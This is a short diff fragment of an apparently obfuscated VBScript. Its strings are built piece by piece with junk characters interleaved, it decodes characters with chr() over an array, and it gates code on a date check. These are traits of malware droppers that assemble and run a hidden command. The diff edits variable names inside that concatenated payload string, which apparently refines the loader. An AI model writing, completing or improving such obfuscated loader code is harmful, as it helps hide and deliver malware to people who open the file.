@@ -192,8 +192,8 @@ Gr2 = Gr2 + "s t rFiPnMg"
 Gr2 = Gr2 + "r(P1A9 3T5 3"
 Gr2 = Gr2 + "P9 , 1 9S2F7 1C)"
 Gr2 = Gr2 + "  ');"
-Gr2 = Gr2 + ".($Fald01) $R"
-Gr2 = Gr2 + "awnessa;}"
+Gr2 = Gr2 + ".($Fald01) $"
+Gr2 = Gr2 + "Fald2;}"
 for Centrale=0 to ubound(Ttheds)
 If Now() < Udblsnings Then 
 Urin = Urin+chr(Ttheds(1))
